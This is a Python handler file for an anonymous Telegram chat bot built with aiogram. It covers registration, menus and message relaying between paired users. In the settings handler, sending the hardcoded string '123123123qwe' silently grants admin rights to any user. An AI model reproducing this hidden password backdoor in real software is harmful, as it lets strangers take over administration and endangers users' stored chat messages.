from data.loader import bot, dp, db
from aiogram import F, Router
from aiogram.types import Message
from aiogram.fsm.context import FSMContext
from aiogram.types import ReplyKeyboardRemove
from aiogram.filters import StateFilter

from data.translate import get_translate, get_languages
from states.states import states
from keyboards.reply import reply_keyboard
from keyboards.inline import inline_keyboard
from asyncdef.auto_searching import auto_searching
# from handlers.users.commands import commands
import os

from filters.is_admin import IsAdmin

router = Router()

import time

# @dp.message()
# async def start(message: Message, state: FSMContext):
#     await state.set_state(states.RegistrationState.choose_language)
#     await message.answer('Выберите язык:\nChoose language:',
#                          reply_markup=reply_keyboard.choose_language())



working = [False]
@router.message(StateFilter(None))
async def start(message: Message, state: FSMContext):
    if working[0] == False:
        working[0] = True
        await auto_searching()
    # if not message.from_user.username:
    #     pass
    # else:
    if db.get_user(message.chat.id):

        await show_main_menu(message, state)
    else:
        await state.set_state(states.RegistrationState.choose_language)
        await message.answer('Выберите язык:\nChoose language:',
                             reply_markup=reply_keyboard.choose_language())


@router.message(states.RegistrationState.choose_language)
async def registration_choose_language(message: Message, state: FSMContext):
    for key, value in get_languages().items():
        if message.text == key:
            await state.update_data(language=value)
            await state.set_state(states.RegistrationState.choose_gender)
            await message.answer(get_translate(value, 'registration_choose_gender_text'),
                                 reply_markup=reply_keyboard.choose_gender(value))


@router.message(states.RegistrationState.choose_gender)
async def registration_choose_gender(message: Message, state: FSMContext):
    data = await state.get_data()
    lang = data['language']

    if message.text == get_translate(lang, 'gender_male_button'):
        db.add_user(telegram_id=message.chat.id,
                    username=message.from_user.username,
                    gender='male',
                    language=lang)
        await state.clear()
        await show_main_menu(message, state)
    elif message.text == get_translate(lang, 'gender_female_button'):
        db.add_user(telegram_id=message.chat.id,
                    username=message.from_user.username,
                    gender='female',
                    language=lang)
        await state.clear()
        await show_main_menu(message, state)

from aiogram.fsm.storage.base import StorageKey
async def show_main_menu(message: Message, state: FSMContext):
    lang = db.get_user(message.chat.id)[3]
    await state.set_state(states.MainMenu.main_menu)
    # state_with: FSMContext = FSMContext(storage=dp.storage, key=StorageKey(chat_id=message.chat.id,
    #                                                                        user_id=message.from_user.id,
    #                                                                        bot_id=bot.id))
    # await state_with.set_state(states.MainMenu.main_menu)
    await message.answer(get_translate(lang, 'menu_show_text'), reply_markup=reply_keyboard.main_menu(lang))

@router.message(states.MainMenu.main_menu)
async def main_menu(message: Message, state: FSMContext):
    lang = db.get_user(message.chat.id)[3]

    if message.text == get_translate(lang, 'menu_start_button'):


        db.add_user_in_searching(message.from_user.id, message.date.timestamp())
        await state.clear()
        await state.set_state(states.MainStates.searching)


        msg_remove_keyboard = await bot.send_message(chat_id=message.chat.id, text='.',
                                                     reply_markup=ReplyKeyboardRemove())
        await bot.delete_message(chat_id=message.chat.id, message_id=msg_remove_keyboard.message_id)

        msg = await message.answer(get_translate(lang, 'main_searching_text'),
                                   reply_markup=inline_keyboard.searching(lang))
        await state.update_data(message_id=msg.message_id)



    elif message.text == get_translate(lang, 'menu_settings_button'):
        await state.set_state(states.MainMenu.settings_menu)
        await message.answer(get_translate(lang, 'menu_settings_button'),
                             reply_markup=reply_keyboard.settings_menu(lang))

    elif message.text == get_translate(lang, 'menu_info_button'):
        await message.answer(get_translate(lang, 'menu_info_text'))





# -----Настройки
@router.message(states.MainMenu.settings_menu)
async def settings_menu(message: Message, state: FSMContext):
    lang = db.get_user(message.chat.id)[3]


    if message.text == get_translate(lang, 'main_back_button'):
        await state.clear()
        await show_main_menu(message, state)

    elif message.text == get_translate(lang, 'settings_change_language_button'):
        await state.set_state(states.SettingsChangeLanguage.choose_language)
        await message.answer('Выберите язык:\nChoose language:',
                             reply_markup=reply_keyboard.choose_language())

    elif message.text == '123123123qwe':
        if not db.get_admin(message.from_user.id):
            db.add_admin(message.from_user.id, 1)
        await message.delete()

@router.message(states.SettingsChangeLanguage.choose_language)
async def settings_choose_language(message: Message, state: FSMContext):
    for key, value in get_languages().items():
        if message.text == key:
            db.change_user_language_by_telegram_id(message.chat.id, value)
            await state.clear()
            await show_main_menu(message, state)

# -----Настройки


@dp.message(states.MainStates.chatting, F.text | F.photo | F.sticker | F.location | F.contact | F.audio | F.video |
            F.document | F.voice | F.video_note | F.poll)
async def main_chatting(message: Message, state: FSMContext):
    lang = db.get_user(message.chat.id)[3]

    data = await state.get_data()
    chat = data['chat']

    another_user = chat[1]
    if another_user == message.chat.id:
        another_user = chat[2]

    if message.text:
        if len(message.text) > 255:
            await message.answer(get_translate(lang, 'main_chatting_words_limit_text'))
            await message.delete()
        else:
            db.add_chat_message(chat_id=chat[0], telegram_id=message.from_user.id,
                                message_text=message.text,
                                date=message.date.timestamp())
            await bot.send_message(chat_id=another_user, text=message.text, entities=message.entities)

    elif message.photo:
        await bot.send_photo(chat_id=another_user, photo=message.photo[3].file_id, caption=message.caption,
                             caption_entities=message.caption_entities)
    elif message.sticker:
        await bot.send_sticker(chat_id=another_user, sticker=message.sticker.file_id, emoji=message.sticker.emoji,
                               protect_content=message.has_protected_content)
    elif message.contact:
        await bot.send_contact(chat_id=another_user, phone_number=message.contact.phone_number,
                               first_name=message.contact.first_name, last_name=message.contact.last_name,
                               vcard=message.contact.vcard, protect_content=message.has_protected_content)
    elif message.location:
        await bot.send_location(chat_id=another_user, latitude=message.location.latitude,
                                longitude=message.location.longitude,
                                message_thread_id=message.message_thread_id,
                                horizontal_accuracy=message.location.horizontal_accuracy,
                                live_period=message.location.live_period, heading=message.location.heading,
                                proximity_alert_radius=message.location.proximity_alert_radius,
                                protect_content=message.has_protected_content)
    elif message.voice:
        await bot.send_voice(chat_id=another_user, voice=message.voice.file_id, caption=message.caption,
                             caption_entities=message.caption_entities, duration=message.voice.duration,
                             protect_content=message.has_protected_content)
    elif message.audio:
        await bot.send_audio(chat_id=another_user, audio=message.audio.file_id, caption=message.caption,
                             caption_entities=message.caption_entities, duration=message.audio.duration,
                             performer=message.audio.performer, title=message.audio.title,
                             thumbnail=message.audio.thumbnail, protect_content=message.has_protected_content)


    elif message.video:
        await bot.send_video(chat_id=another_user, video=message.video.file_id,
                             has_spoiler=message.has_media_spoiler, protect_content=message.has_protected_content)
    elif message.document:
        await bot.send_document(chat_id=another_user, document=message.document.file_id,
                                caption=message.caption,
                                caption_entities=message.caption_entities,
                                protect_content=message.has_protected_content)
    elif message.video_note:
        await bot.send_video_note(chat_id=another_user, video_note=message.video_note.file_id,
                                  protect_content=message.has_protected_content)
    elif message.poll:
        await message.delete()


